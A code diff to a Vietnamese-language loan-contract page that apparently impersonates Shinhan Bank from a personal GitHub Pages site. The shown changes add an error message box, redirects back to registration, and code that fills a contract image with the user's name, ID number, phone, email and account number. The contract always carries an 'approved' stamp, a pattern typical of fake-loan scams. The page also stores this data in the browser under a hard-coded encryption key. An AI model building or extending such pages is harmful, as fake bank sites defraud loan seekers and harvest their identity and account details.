@@ -236,6 +236,17 @@
             background-color: #e6f0fa;
             color: #0052cc;
         }
+        .error-message {
+            color: #ff4d4f;
+            font-size: 14px;
+            font-weight: 500;
+            text-align: center;
+            margin-top: 5px;
+            padding: 6px;
+            background-color: #ffe6e6;
+            border-radius: 5px;
+            display: none;
+        }
     </style>
 </head>
 <body>
@@ -275,6 +286,7 @@
 
         <div id="step7" class="step-transition">
             <h5 class="step-title">Xem Hợp Đồng</h5>
+            <div class="error-message" id="formError"></div>
             <p class="step-description">Dưới đây là hợp đồng vay tín chấp của bạn. Vui lòng kiểm tra kỹ thông tin.</p>
             <div class="image-section">
                 <canvas id="contractCanvas"></canvas>
@@ -332,6 +344,7 @@
                 console.log('Saved userData:', userData);
             } catch (error) {
                 console.error('Error saving userData:', error);
+                $('#formError').text('Lỗi lưu dữ liệu. Vui lòng thử lại.').show();
             }
         }
 
@@ -340,20 +353,29 @@
                 const storedData = localStorage.getItem('userData');
                 if (storedData) {
                     userData = JSON.parse(CryptoJS.AES.decrypt(storedData, 'shinhan-secret-key').toString(CryptoJS.enc.Utf8));
-                    console.log('Loaded userData:', userData);
-                    if (!userData.isRegistered) {
-                        alert('Bạn đã có hồ sơ tại Ngân hàng Shinhan Bank. Vui lòng quay lại bước đăng ký.');
-                        window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/loan_registration.html';
+                    console.log('Loaded userData for Step 6:', userData);
+                    if (!userData.isRegistered || !userData.fullName) {
+                        $('#formError').text('Không tìm thấy hồ sơ đã đăng ký. Vui lòng quay lại bước đăng ký.').show();
+                        $('#downloadContractBtn, #continueToStep8Btn').prop('disabled', true);
+                        setTimeout(() => {
+                            window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/loan_registration.html';
+                        }, 3000);
                     }
                 } else {
                     console.error('No userData found in localStorage');
-                    alert('Không tìm thấy dữ liệu hồ sơ, vui lòng thử lại.');
-                    window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/loan_registration.html';
+                    $('#formError').text('Không tìm thấy dữ liệu hồ sơ. Vui lòng quay lại bước đăng ký.').show();
+                    $('#downloadContractBtn, #continueToStep8Btn').prop('disabled', true);
+                    setTimeout(() => {
+                        window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/loan_registration.html';
+                    }, 3000);
                 }
             } catch (error) {
                 console.error('Error parsing userData:', error);
-                alert('Lỗi tải dữ liệu, vui lòng thử lại.');
-                window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/loan_registration.html';
+                $('#formError').text('Lỗi tải dữ liệu. Vui lòng quay lại bước đăng ký.').show();
+                $('#downloadContractBtn, #continueToStep8Btn').prop('disabled', true);
+                setTimeout(() => {
+                    window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/loan_registration.html';
+                }, 3000);
             }
         }
 
@@ -413,43 +435,43 @@
         }
 
         const canvasFields = [
-            { label: "", value: userData.disbursementDate ? splitDate(userData.disbursementDate).day : "Không có", x: 539, y: 443, font: "36px Arial bold", color: "#000000" },
-            { label: "", value: userData.disbursementDate ? splitDate(userData.disbursementDate).month : "Không có", x: 710, y: 443, font: "36px Arial bold", color: "#000000" },
-            { label: "", value: userData.disbursementDate ? splitDate(userData.disbursementDate).year : "Không có", x: 902, y: 443, font: "36px Arial bold", color: "#000000" },
-            { label: "", value: userData.fullName || "Không có", x: 685, y: 517, font: "36px Arial bold", color: "#000000" },
-            { label: "", value: userData.idNumber || "Không có", x: 683, y: 585, font: "36px Arial bold", color: "#000000" },
-            { label: "", value: userData.phoneNumber || "Không có", x: 683, y: 725, font: "36px Arial bold", color: "#000000" },
-            { label: "", value: userData.email || "Không có", x: 683, y: 795, font: "36px Arial bold", color: "#000000" },
-            { label: "", value: userData.loanAmount ? `${formatNumber(userData.loanAmount)} VND` : "Không có", x: 683, y: 961, font: "36px Arial bold", color: "#000000" },
-            { label: "", value: userData.loanPurpose || "Không có", x: 673, y: 1233, font: "36px Arial bold", color: "#000000" },
-            { label: "", value: userData.accountNumber || "Không có", x: 591, y: 2063, font: "36px Arial bold", color: "#000000" },
-            { label: "", value: userData.loanCode || "Không có", x: 1629, y: 573, font: "36px Arial bold", color: "#FF0000" },
-            { label: "", value: userData.disbursementDate || "Không có", x: 2005, y: 571, font: "36px Arial bold", color: "#000000" },
-            { label: "", value: userData.staffName || "Không có", x: 1325, y: 2204, font: "36px Arial bold", color: "#000000" },
-            { label: "", value: userData.branchName || "Không có", x: 1326, y: 2277, font: "36px Arial bold", color: "#000000" },
-            { label: "", value: userData.branchCode || "Không có", x: 1550, y: 2369, font: "36px Arial bold", color: "#000000" },
-            { label: "", value: userData.staffCode || "Không có", x: 1995, y: 2369, font: "36px Arial bold", color: "#000000" },
+            { label: "", value: "", x: 539, y: 443, font: "36px Arial bold", color: "#000000" }, // disbursementDate.day
+            { label: "", value: "", x: 710, y: 443, font: "36px Arial bold", color: "#000000" }, // disbursementDate.month
+            { label: "", value: "", x: 902, y: 443, font: "36px Arial bold", color: "#000000" }, // disbursementDate.year
+            { label: "", value: "", x: 685, y: 517, font: "36px Arial bold", color: "#000000" }, // fullName
+            { label: "", value: "", x: 683, y: 585, font: "36px Arial bold", color: "#000000" }, // idNumber
+            { label: "", value: "", x: 683, y: 725, font: "36px Arial bold", color: "#000000" }, // phoneNumber
+            { label: "", value: "", x: 683, y: 795, font: "36px Arial bold", color: "#000000" }, // email
+            { label: "", value: "", x: 683, y: 961, font: "36px Arial bold", color: "#000000" }, // loanAmount
+            { label: "", value: "", x: 673, y: 1233, font: "36px Arial bold", color: "#000000" }, // loanPurpose
+            { label: "", value: "", x: 591, y: 2063, font: "36px Arial bold", color: "#000000" }, // accountNumber
+            { label: "", value: "", x: 1629, y: 573, font: "36px Arial bold", color: "#FF0000" }, // loanCode
+            { label: "", value: "", x: 2005, y: 571, font: "36px Arial bold", color: "#000000" }, // disbursementDate
+            { label: "", value: "Không có", x: 1325, y: 2204, font: "36px Arial bold", color: "#000000" }, // staffName
+            { label: "", value: "Không có", x: 1326, y: 2277, font: "36px Arial bold", color: "#000000" }, // branchName
+            { label: "", value: "Không có", x: 1550, y: 2369, font: "36px Arial bold", color: "#000000" }, // branchCode
+            { label: "", value: "Không có", x: 1995, y: 2369, font: "36px Arial bold", color: "#000000" }, // staffCode
             { label: "", value: "Đã xét duyệt", x: 1697, y: 2789, font: "36px Arial bold", color: "#000000" },
-            { label: "", value: userData.loanAmount ? `${formatNumber(userData.loanAmount)} VND` : "Không có", x: 1699, y: 2903, font: "36px Arial bold", color: "#000000" },
-            { label: "", value: userData.disbursementDate ? splitDate(userData.disbursementDate).day : "Không có", x: 1645, y: 2977, font: "36px Arial bold", color: "#000000" },
-            { label: "", value: userData.disbursementDate ? splitDate(userData.disbursementDate).month : "Không có", x: 1825, y: 2977, font: "36px Arial bold", color: "#000000" }
+            { label: "", value: "", x: 1699, y: 2903, font: "36px Arial bold", color: "#000000" }, // loanAmount
+            { label: "", value: "", x: 1645, y: 2977, font: "36px Arial bold", color: "#000000" }, // disbursementDate.day
+            { label: "", value: "", x: 1825, y: 2977, font: "36px Arial bold", color: "#000000" }  // disbursementDate.month
         ];
 
         const tickFields = [
-            { condition: userData.loanPurpose === "Mua nhà", x: 183, y: 1123, symbol: "✓", font: "36px Arial bold", color: "#FF0000" },
-            { condition: userData.loanPurpose === "Mua xe", x: 511, y: 1161, symbol: "✓", font: "36px Arial bold", color: "#FF0000" },
-            { condition: userData.loanPurpose === "Kinh doanh", x: 767, y: 1159, symbol: "✓", font: "36px Arial bold", color: "#FF0000" },
-            { condition: userData.loanPurpose === "Học tập", x: 183, y: 1157, symbol: "✓", font: "36px Arial bold", color: "#FF0000" },
-            { condition: userData.loanPurpose === "Du lịch", x: 511, y: 1123, symbol: "✓", font: "36px Arial bold", color: "#FF0000" },
-            { condition: userData.loanPurpose === "Tiêu dùng", x: 767, y: 1123, symbol: "✓", font: "36px Arial bold", color: "#FF0000" },
-            { condition: userData.loanPurpose === "Khác", x: 183, y: 1180, symbol: "✓", font: "36px Arial bold", color: "#FF0000" },
-            { condition: userData.loanTerm === "6", x: 431, y: 1479, symbol: "✓", font: "36px Arial bold", color: "#FF0000" },
-            { condition: userData.loanTerm === "12", x: 575, y: 1479, symbol: "✓", font: "36px Arial bold", color: "#FF0000" },
-            { condition: userData.loanTerm === "18", x: 647, y: 1479, symbol: "✓", font: "36px Arial bold", color: "#FF0000" },
-            { condition: userData.loanTerm === "24", x: 719, y: 1483, symbol: "✓", font: "36px Arial bold", color: "#FF0000" },
-            { condition: userData.loanTerm === "36", x: 865, y: 1483, symbol: "✓", font: "36px Arial bold", color: "#FF0000" },
-            { condition: userData.loanTerm === "48", x: 937, y: 1483, symbol: "✓", font: "36px Arial bold", color: "#FF0000" },
-            { condition: userData.loanTerm === "60", x: 1009, y: 1483, symbol: "✓", font: "36px Arial bold", color: "#FF0000" },
+            { condition: false, x: 183, y: 1123, symbol: "✓", font: "36px Arial bold", color: "#FF0000" }, // loanPurpose: Mua nhà
+            { condition: false, x: 511, y: 1161, symbol: "✓", font: "36px Arial bold", color: "#FF0000" }, // loanPurpose: Mua xe
+            { condition: false, x: 767, y: 1159, symbol: "✓", font: "36px Arial bold", color: "#FF0000" }, // loanPurpose: Kinh doanh
+            { condition: false, x: 183, y: 1157, symbol: "✓", font: "36px Arial bold", color: "#FF0000" }, // loanPurpose: Học tập
+            { condition: false, x: 511, y: 1123, symbol: "✓", font: "36px Arial bold", color: "#FF0000" }, // loanPurpose: Du lịch
+            { condition: false, x: 767, y: 1123, symbol: "✓", font: "36px Arial bold", color: "#FF0000" }, // loanPurpose: Tiêu dùng
+            { condition: false, x: 183, y: 1180, symbol: "✓", font: "36px Arial bold", color: "#FF0000" }, // loanPurpose: Khác
+            { condition: false, x: 431, y: 1479, symbol: "✓", font: "36px Arial bold", color: "#FF0000" }, // loanTerm: 6
+            { condition: false, x: 575, y: 1479, symbol: "✓", font: "36px Arial bold", color: "#FF0000" }, // loanTerm: 12
+            { condition: false, x: 647, y: 1479, symbol: "✓", font: "36px Arial bold", color: "#FF0000" }, // loanTerm: 18
+            { condition: false, x: 719, y: 1483, symbol: "✓", font: "36px Arial bold", color: "#FF0000" }, // loanTerm: 24
+            { condition: false, x: 865, y: 1483, symbol: "✓", font: "36px Arial bold", color: "#FF0000" }, // loanTerm: 36
+            { condition: false, x: 937, y: 1483, symbol: "✓", font: "36px Arial bold", color: "#FF0000" }, // loanTerm: 48
+            { condition: false, x: 1009, y: 1483, symbol: "✓", font: "36px Arial bold", color: "#FF0000" }, // loanTerm: 60
             { condition: true, x: 2119, y: 2495, symbol: "✓", font: "36px Arial bold", color: "#FF0000" },
             { condition: true, x: 2119, y: 2587, symbol: "✓", font: "36px Arial bold", color: "#FF0000" },
             { condition: true, x: 2119, y: 2641, symbol: "✓", font: "36px Arial bold", color: "#FF0000" },
@@ -469,6 +491,7 @@
 
         window.onload = function() {
             loadUserData();
+
             // Cập nhật canvasFields với dữ liệu từ userData
             canvasFields[0].value = userData.disbursementDate ? splitDate(userData.disbursementDate).day : "Không có";
             canvasFields[1].value = userData.disbursementDate ? splitDate(userData.disbursementDate).month : "Không có";
@@ -485,6 +508,22 @@
             canvasFields[17].value = userData.loanAmount ? `${formatNumber(userData.loanAmount)} VND` : "Không có";
             canvasFields[18].value = userData.disbursementDate ? splitDate(userData.disbursementDate).day : "Không có";
             canvasFields[19].value = userData.disbursementDate ? splitDate(userData.disbursementDate).month : "Không có";
+
+            // Cập nhật tickFields dựa trên loanPurpose và loanTerm
+            tickFields[0].condition = userData.loanPurpose === "Mua nhà";
+            tickFields[1].condition = userData.loanPurpose === "Mua xe";
+            tickFields[2].condition = userData.loanPurpose === "Kinh doanh";
+            tickFields[3].condition = userData.loanPurpose === "Học tập";
+            tickFields[4].condition = userData.loanPurpose === "Du lịch";
+            tickFields[5].condition = userData.loanPurpose === "Tiêu dùng";
+            tickFields[6].condition = userData.loanPurpose === "Khác";
+            tickFields[7].condition = userData.loanTerm === "6";
+            tickFields[8].condition = userData.loanTerm === "12";
+            tickFields[9].condition = userData.loanTerm === "18";
+            tickFields[10].condition = userData.loanTerm === "24";
+            tickFields[11].condition = userData.loanTerm === "36";
+            tickFields[12].condition = userData.loanTerm === "48";
+            tickFields[13].condition = userData.loanTerm === "60";
 
             renderCanvas('contractCanvas', 'https://raw.githubusercontent.com/vaytieudung/shinhanbank/main/assets/img/anhhopdongvay.png', 'https://via.placeholder.com/2480x3508?text=Hinh+Hop+Dong');
             userData.currentStep = 7;
